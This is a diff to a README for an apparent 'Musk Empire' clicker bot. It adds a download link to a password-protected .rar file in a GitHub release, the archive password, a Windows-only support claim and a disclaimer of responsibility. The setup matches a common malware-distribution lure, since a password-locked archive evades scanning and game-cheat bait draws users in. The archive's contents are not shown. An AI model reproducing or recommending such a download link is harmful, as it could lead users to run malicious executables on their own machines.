@@ -3,7 +3,7 @@
 
 
 
-* ## [Download]()
+* ## [Download](https://github.com/Amanuel-guben/Musk-Empire-ClickerAuto/releases/download/empire/musk.empire.bot.rar)
 * ## PASS: LOAD12121
 
 ## Functionality
@@ -23,6 +23,17 @@
 | Docker                                |     ✅     |
 
 
+
+
+## ✅Support for systems
+- Supports Windows 7/10/11 (x32/x64)
+
+## 📞 Contact us
+- If you have any questions or concerns, feel free to contact us.
+
+## Important
+
+- we are not responsible for your actions. use the product for good purposes for the good of the people.
 
 ## Contributors
 
